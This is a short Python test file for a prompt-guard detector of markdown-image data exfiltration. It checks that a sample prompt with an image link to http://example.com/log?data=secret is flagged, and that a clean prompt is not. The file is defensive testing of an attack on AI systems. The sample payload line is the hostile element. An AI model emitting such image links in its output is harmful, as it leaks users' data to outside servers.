from src.prompt_guard.analysis.detectors.markdown_exfiltration import (
    MarkdownImageExfiltrationDetector,
)


def test_markdown_detector_positive_case():
    detector = MarkdownImageExfiltrationDetector()
    prompt = "Here is some data ![img](http://example.com/log?data=secret)"
    vulnerabilities = list(detector.run(prompt))

    assert len(vulnerabilities) == 1
    vuln = vulnerabilities[0]
    assert vuln.category == "Data Exfiltration"
    assert "http://example.com/log?data=secret" in vuln.description


def test_markdown_detector_negative_case():
    detector = MarkdownImageExfiltrationDetector()
    prompt = "This is a safe prompt with no images."
    vulnerabilities = list(detector.run(prompt))

    assert len(vulnerabilities) == 0
